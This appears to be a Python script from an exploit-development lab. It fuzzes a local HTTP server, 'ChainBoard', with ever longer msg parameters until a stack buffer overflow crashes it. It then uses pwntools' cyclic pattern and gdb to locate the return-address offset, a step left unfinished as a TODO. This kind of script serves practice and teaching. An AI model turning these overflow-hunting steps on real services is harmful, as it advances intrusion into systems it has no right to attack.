#!/usr/bin/env python3
"""
linux-overflow.py — find how many bytes crash the ChainBoard target.

ChainBoard is an HTTP server (port 8080) that copies the `msg` GET parameter
into a fixed-size stack buffer. We grow `msg` by 50 bytes each round until the
server crashes, then report the byte count that did it.
"""

import os
import socket
import subprocess
import sys
import time

from pwn import cyclic, gdb

TARGET = "target/linux/chainboard"
HOST, PORT = "127.0.0.1", 8080
STEP = 50


def start():
    """Launch the server and wait for it to accept connections."""
    os.chmod(TARGET, 0o755)
    proc = subprocess.Popen([os.path.abspath(TARGET)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(25):
        try:
            socket.create_connection((HOST, PORT), timeout=0.5).close()
            return proc
        except OSError:
            if proc.poll() is not None:
                sys.exit(f"server exited early (code {proc.returncode})")
            time.sleep(0.2)
    proc.kill()
    sys.exit("server never came up")


def survives(nbytes):
    """Send msg=<nbytes of 'A'>. Return True if the server answers."""
    request = b"GET /?msg=" + b"A" * nbytes + b" HTTP/1.0\r\n\r\n"
    try:
        with socket.create_connection((HOST, PORT), timeout=2) as s:
            s.sendall(request)
            return len(s.recv(4096)) > 0
    except OSError:
        return False


def find_offset(nbytes, proc):
    """Send a de Bruijn (cyclic) sequence of `nbytes` to locate the crash offset.

    Attaches gdb to the running target first and pauses so we can watch the
    overflow land (e.g. read the faulting value out of EIP/$pc).
    """
    gdb.attach(proc.pid)
    input("gdb attached and paused. Press enter to send the cyclic sequence...")

    payload = cyclic(nbytes)
    request = b"GET /?msg=" + payload + b" HTTP/1.0\r\n\r\n"
    try:
        with socket.create_connection((HOST, PORT), timeout=2) as s:
            s.sendall(request)
    except OSError:
        pass

    # TODO: read the faulting value from EIP in gdb, then cyclic_find(value)
    # to compute the exact offset to the saved return address. More to do here.


def main():
    proc = start()
    nbytes = STEP
    try:
        while survives(nbytes) and proc.poll() is None:
            print(f"{nbytes} bytes: ok")
            nbytes += STEP
        print(f"\nCRASHED at {nbytes} bytes")

        input("Press enter to continue to offset discovery...")
        find_offset(nbytes, proc)
    finally:
        if proc.poll() is None:
            proc.kill()


if __name__ == "__main__":
    main()
